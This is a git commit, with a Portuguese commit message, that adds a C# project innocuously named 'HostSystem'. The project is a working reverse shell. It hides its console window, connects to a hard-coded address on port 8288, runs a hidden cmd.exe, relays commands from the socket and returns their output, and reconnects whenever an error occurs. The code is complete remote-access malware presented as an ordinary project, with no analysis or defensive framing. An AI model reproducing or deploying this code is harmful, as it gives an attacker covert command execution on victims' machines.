7bd624a493700139bac5eb7fc2a2ed0bbb03a4f4
augus <augus@VM-NOTE-01>
2023-11-27 20:18:24 -0300

    Adicionar arquivos de projeto.

---
+++ HostSystem/Class1Sh.cs
@@ -0,0 +1,111 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+
+
+namespace HostSystem
+{
+	internal class Class1Sh
+	{
+		static StreamWriter streamWriter;
+
+		
+
+		public string Cod(string ip, int porta)
+		{
+			
+			
+				TcpClient client = new TcpClient();
+			try
+			{
+
+				client.Connect(ip, porta);
+				Console.WriteLine(ip, porta);
+
+				using (Stream stream = client.GetStream())
+				{
+					using (StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while (true)
+						{
+
+							try
+							{
+								strInput.Append(rdr.ReadLine());
+								//strInput.Append("\n");
+								p.StandardInput.WriteLine(strInput);
+								strInput.Remove(0, strInput.Length);
+							}
+							catch (Exception)
+							{
+								Cod(ip, porta);
+								Console.WriteLine("reconectando");
+								Console.ReadLine();
+
+							}
+
+						}
+					}
+					
+				}
+
+				
+
+			}
+			catch(Exception)
+            {
+				Cod(ip, porta);
+				
+			}
+			return Convert.ToString(client);
+
+
+
+
+
+
+
+
+
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+		{
+			StringBuilder strOutput = new StringBuilder();
+
+			if (!String.IsNullOrEmpty(outLine.Data))
+			{
+				try
+				{
+					strOutput.Append(outLine.Data);
+					streamWriter.WriteLine(strOutput);
+					streamWriter.Flush();
+				}
+				catch (Exception err) { }
+			}
+		}
+
+	}
+  
+}
---
+++ HostSystem/Program.cs
@@ -0,0 +1,72 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Timers;
+using System.Threading;
+
+
+
+namespace HostSystem
+{
+	public class Program
+	{
+		//bibliotes do windows para ocutar tela preta
+		[DllImport("kernel32.dll")]
+		static extern IntPtr GetConsoleWindow();
+
+		[DllImport("user32.dll")]
+		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+		
+		//fim da biblioteca ocultar
+		public static void Main(string[] args)
+		{
+
+			//ocutar ou exibir a tela preta, quando executado no visual studio ele exibe a ela preta, na const ocutar 1 para exibir e 0 para ocuatar
+			const int ocultar = 1;
+			const int mostrar = 5;
+			var handle = GetConsoleWindow();
+			ShowWindow(handle, ocultar);
+			//ShowWindow(handle, mostrar);
+			//fim do ocuta
+
+			string ip;
+			int porta;
+
+
+			Class1Sh sh = new Class1Sh();
+
+
+			try
+			{
+
+				ip = "172.16.0.108";
+				porta = 8288;
+				sh.Cod(ip, porta);
+
+			}
+			catch (Exception)
+			{
+				ip = "172.16.0.108";
+				porta = 8288;
+				sh.Cod(ip, porta);
+				Console.WriteLine("Erro de Conecxao");
+				Console.ReadLine();
+			}
+
+			
+
+
+		}
+
+		
+
+
+	}
+}
